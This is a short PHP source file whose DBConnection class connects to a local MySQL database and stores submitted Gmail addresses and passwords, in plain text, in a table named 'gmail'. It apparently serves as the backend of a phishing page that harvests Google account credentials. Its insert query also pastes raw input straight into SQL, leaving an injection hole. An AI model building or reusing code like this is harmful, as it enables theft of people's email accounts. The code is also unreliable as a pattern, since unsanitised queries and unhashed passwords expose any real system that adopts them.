<?php
class DBConnection { 
  public $servername = "localhost"; 
  public $db_name = "db_test";
  public $username = "roor";
  public $password = "";
  private $coon;
    
    function __construct() {
        $this->coon = new mysqli($this->servername, $this->username, $this->password, $this->db_name);
    } 

    public function save_gmail($user_gmail, $user_password){ 
      $sql = "INSERT INTO `gmail` (`user_gmail`, `user_password`) VALUES ('$user_gmail', '$user_password')";
      $this->coon->query($sql);
    }
}